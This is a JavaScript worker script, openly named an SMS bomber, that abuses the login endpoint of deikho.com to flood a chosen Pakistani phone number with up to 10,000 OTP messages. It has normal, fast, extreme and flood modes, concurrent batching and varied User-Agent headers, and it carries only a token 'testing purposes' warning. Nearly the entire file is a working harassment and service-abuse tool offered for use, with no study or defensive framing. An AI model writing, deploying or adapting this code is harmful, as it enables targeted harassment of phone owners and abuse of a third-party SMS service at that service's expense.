// SMS Bomber API using deikho.com ONLY for Pakistan
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const phone = url.searchParams.get('phone');
  const qty = parseInt(url.searchParams.get('qty')) || 10;
  const mode = url.searchParams.get('mode') || 'normal';

  // CORS headers
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json'
  };

  if (request.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  // Validate input
  if (!phone) {
    return new Response(
      JSON.stringify({
        status: 'error',
        message: 'Phone parameter is required',
        example: '/?phone=923001234567&qty=100&mode=fast'
      }, null, 2),
      { status: 400, headers: corsHeaders }
    );
  }

  if (qty > 10000) {
    return new Response(
      JSON.stringify({
        status: 'error',
        message: 'Maximum 10000 messages allowed'
      }, null, 2),
      { status: 400, headers: corsHeaders }
    );
  }

  // Format Pakistan phone number
  const formattedPhone = formatPakistanPhone(phone);
  if (!formattedPhone) {
    return new Response(
      JSON.stringify({
        status: 'error',
        message: 'Invalid Pakistan phone number. Use format: 923001234567 or 03001234567'
      }, null, 2),
      { status: 400, headers: corsHeaders }
    );
  }

  try {
    const startTime = Date.now();
    
    let results;
    
    // Select bombing mode
    switch(mode) {
      case 'fast':
        results = await fastBombDeikho(formattedPhone, qty);
        break;
      case 'extreme':
        results = await extremeBombDeikho(formattedPhone, qty);
        break;
      case 'flood':
        results = await floodModeDeikho(formattedPhone, qty);
        break;
      default:
        results = await normalBombDeikho(formattedPhone, qty);
    }
    
    const totalTime = Date.now() - startTime;

    return new Response(
      JSON.stringify({
        status: 'success',
        phone: formattedPhone,
        quantity: qty,
        mode: mode,
        api_used: 'deikho.com ONLY',
        messages_sent: results.successful,
        failed: results.failed,
        success_rate: `${((results.successful / qty) * 100).toFixed(1)}%`,
        total_time: `${totalTime}ms`,
        speed: `${(qty / (totalTime / 1000)).toFixed(2)} requests/sec`,
        average_response_time: `${(totalTime / qty).toFixed(0)}ms per request`,
        results: results.details,
        timestamp: new Date().toISOString(),
        api_endpoint: 'https://deikho.com/login?phone=',
        warning: 'Use responsibly - Only for testing purposes!'
      }, null, 2),
      { headers: corsHeaders }
    );

  } catch (error) {
    return new Response(
      JSON.stringify({
        status: 'error',
        message: error.message,
        api: 'deikho.com',
        timestamp: new Date().toISOString()
      }, null, 2),
      { status: 500, headers: corsHeaders }
    );
  }
}

// Format Pakistan phone number
function formatPakistanPhone(phone) {
  // Remove all non-digits
  let cleaned = phone.replace(/\D/g, '');
  
  // Check if it's a valid Pakistan number
  if (cleaned.length < 10 || cleaned.length > 12) {
    return null;
  }
  
  // If it starts with 0 (like 03001234567)
  if (cleaned.startsWith('0')) {
    cleaned = '92' + cleaned.substring(1);
  }
  
  // If it's 10 digits (like 3001234567)
  if (cleaned.length === 10) {
    cleaned = '92' + cleaned;
  }
  
  // Ensure it starts with 92 and has correct length
  if (!cleaned.startsWith('92') || cleaned.length !== 12) {
    return null;
  }
  
  // Check Pakistan mobile prefixes
  const prefixes = ['92300', '92301', '92302', '92303', '92304', '92305', '92306', '92307', '92308', '92309', '92310', '92311', '92312', '92313', '92314', '92315'];
  const isValidPrefix = prefixes.some(prefix => cleaned.startsWith(prefix));
  
  if (!isValidPrefix) {
    return null;
  }
  
  return cleaned;
}

// Normal bombing mode
async function normalBombDeikho(phone, quantity) {
  const results = [];
  let successful = 0;
  let failed = 0;
  
  const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
  
  for (let i = 0; i < quantity; i++) {
    try {
      const start = Date.now();
      
      const response = await fetch(DEIKHO_API, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Referer': 'https://deikho.com/',
          'Origin': 'https://deikho.com',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      });
      
      const responseTime = Date.now() - start;
      
      if (response.ok) {
        successful++;
        results.push({
          attempt: i + 1,
          status: 'success',
          response_time: `${responseTime}ms`,
          status_code: response.status
        });
      } else {
        failed++;
        results.push({
          attempt: i + 1,
          status: 'failed',
          status_code: response.status,
          response_time: `${responseTime}ms`
        });
      }
      
      // Small delay between requests (100ms)
      if (i < quantity - 1) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
    } catch (error) {
      failed++;
      results.push({
        attempt: i + 1,
        status: 'error',
        error: error.message
      });
    }
  }
  
  return {
    successful: successful,
    failed: failed,
    details: results.slice(0, 20)
  };
}

// Fast bombing mode (concurrent)
async function fastBombDeikho(phone, quantity) {
  const BATCH_SIZE = 10;
  const CONCURRENT = 5;
  const results = [];
  let totalSuccessful = 0;
  
  const batches = Math.ceil(quantity / BATCH_SIZE);
  
  for (let batch = 0; batch < batches; batch++) {
    const currentBatch = Math.min(BATCH_SIZE, quantity - (batch * BATCH_SIZE));
    
    const batchPromises = [];
    
    for (let i = 0; i < CONCURRENT && i < currentBatch; i++) {
      const requestIndex = (batch * BATCH_SIZE) + i;
      if (requestIndex >= quantity) break;
      
      batchPromises.push(
        (async () => {
          try {
            const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
            const response = await fetch(DEIKHO_API, {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*'
              }
            });
            
            return {
              attempt: requestIndex + 1,
              success: response.ok,
              status: response.status
            };
          } catch (error) {
            return {
              attempt: requestIndex + 1,
              success: false,
              error: error.message
            };
          }
        })()
      );
    }
    
    const batchResults = await Promise.allSettled(batchPromises);
    
    batchResults.forEach(result => {
      if (result.value) {
        if (result.value.success) {
          totalSuccessful++;
        }
        results.push(result.value);
      }
    });
    
    if (batch < batches - 1) {
      await new Promise(resolve => setTimeout(resolve, 50));
    }
  }
  
  return {
    successful: totalSuccessful,
    failed: quantity - totalSuccessful,
    details: results.slice(0, 15)
  };
}

// Extreme bombing mode (maximum speed)
async function extremeBombDeikho(phone, quantity) {
  const MAX_CONCURRENT = 20;
  const results = [];
  let successful = 0;
  
  const promises = [];
  
  for (let i = 0; i < quantity; i++) {
    promises.push(
      (async (index) => {
        try {
          const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
          const response = await fetch(DEIKHO_API, {
            headers: {
              'User-Agent': `Mozilla/5.0 (Request-${index})`,
              'Accept': '*/*'
            }
          });
          
          const success = response.ok;
          if (success) successful++;
          
          return {
            attempt: index + 1,
            success: success,
            status: response.status
          };
        } catch (error) {
          return {
            attempt: index + 1,
            success: false,
            error: error.message
          };
        }
      })(i)
    );
    
    if (promises.length >= MAX_CONCURRENT || i === quantity - 1) {
      const batchResults = await Promise.allSettled(promises);
      batchResults.forEach(result => {
        if (result.value) {
          results.push(result.value);
        }
      });
      promises.length = 0;
    }
  }
  
  return {
    successful: successful,
    failed: quantity - successful,
    details: results.slice(0, 10)
  };
}

// Flood mode (continuous requests)
async function floodModeDeikho(phone, quantity) {
  const DURATION = 30000;
  const startTime = Date.now();
  const endTime = startTime + DURATION;
  
  const results = [];
  let successful = 0;
  let attempts = 0;
  
  while (Date.now() < endTime && attempts < quantity) {
    attempts++;
    
    try {
      const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
      const response = await fetch(DEIKHO_API, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Flood-Mode)',
          'Accept': '*/*'
        }
      });
      
      if (response.ok) {
        successful++;
      }
      
      if (attempts % 10 === 0) {
        results.push({
          batch: attempts / 10,
          time_elapsed: `${Date.now() - startTime}ms`,
          successful_so_far: successful,
          attempts_so_far: attempts
        });
      }
      
    } catch (error) {
      // Continue despite errors
    }
    
    if (attempts >= quantity) break;
  }
  
  const actualQuantity = Math.min(attempts, quantity);
  
  return {
    successful: successful,
    failed: actualQuantity - successful,
    details: [{
      mode: 'flood',
      duration: `${Date.now() - startTime}ms`,
      total_attempts: attempts,
      successful: successful,
      failed: attempts - successful,
      requests_per_second: (attempts / ((Date.now() - startTime) / 1000)).toFixed(2)
    }]
  };
}

// Health check endpoint
async function handleHealthRequest() {
  try {
    const testPhone = '923001234567';
    const DEIKHO_API = `https://deikho.com/login?phone=${testPhone}`;
    
    const response = await fetch(DEIKHO_API, {
      headers: {
        'User-Agent': 'Health-Check/1.0'
      }
    });
    
    return new Response(JSON.stringify({
      status: 'online',
      service: 'Deikho.com SMS Bomber - Pakistan Only',
      version: '1.0',
      api_endpoint: 'https://deikho.com/login?phone=',
      deikho_status: response.ok ? 'working' : 'down',
      limits: {
        max_messages: 10000,
        modes: ['normal', 'fast', 'extreme', 'flood'],
        supported_formats: ['923001234567', '03001234567', '3001234567']
      },
      usage: '/?phone=PHONE&qty=QUANTITY&mode=MODE',
      example: '/?phone=3001234567&qty=100&mode=fast',
      timestamp: new Date().toISOString()
    }, null, 2), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  } catch (error) {
    return new Response(JSON.stringify({
      status: 'error',
      message: 'Deikho.com is not reachable',
      error: error.message
    }, null, 2), {
      status: 503,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// Test endpoint
async function handleTestRequest(phone) {
  try {
    const formattedPhone = formatPakistanPhone(phone);
    if (!formattedPhone) {
      return new Response(JSON.stringify({
        test: 'failed',
        message: 'Invalid Pakistan phone number'
      }, null, 2), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    const DEIKHO_API = `https://deikho.com/login?phone=${formattedPhone}`;
    const response = await fetch(DEIKHO_API);
    
    return new Response(JSON.stringify({
      test: 'success',
      original_phone: phone,
      formatted_phone: formattedPhone,
      api: 'deikho.com',
      status: response.status,
      working: response.ok,
      valid_pakistan_number: true
    }, null, 2), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  } catch (error) {
    return new Response(JSON.stringify({
      test: 'failed',
      error: error.message
    }, null, 2), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// Main fetch handler
addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  
  // Health check endpoint
  if (url.pathname === '/health' || url.pathname === '/status') {
    event.respondWith(handleHealthRequest());
    return;
  }
  
  // Test endpoint
  if (url.pathname === '/test') {
    const testPhone = url.searchParams.get('phone') || '923001234567';
    event.respondWith(handleTestRequest(testPhone));
    return;
  }
  
  // API info endpoint
  if (url.pathname === '/info' || url.pathname === '/') {
    event.respondWith(new Response(JSON.stringify({
      api_name: 'Deikho.com SMS Bomber - Pakistan',
      description: 'SMS bombing API using deikho.com for Pakistan numbers only',
      endpoints: {
        main: '/?phone=PHONE&qty=QUANTITY&mode=MODE',
        health: '/health',
        test: '/test?phone=PHONE'
      },
      phone_formats: [
        '923001234567 (With country code)',
        '03001234567 (With leading zero)',
        '3001234567 (Without country code)'
      ],
      valid_prefixes: [
        '92300', '92301', '92302', '92303', '92304',
        '92305', '92306', '92307', '92308', '92309',
        '92310', '92311', '92312', '92313', '92314', '92315'
      ],
      modes: {
        normal: 'Sequential requests with 100ms delay',
        fast: 'Concurrent batches (5x faster)',
        extreme: 'Maximum concurrent requests',
        flood: 'Continuous bombing for 30 seconds'
      }
    }, null, 2), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    }));
    return;
  }
  
  // Handle main API request
  event.respondWith(handleRequest(event.request));
});
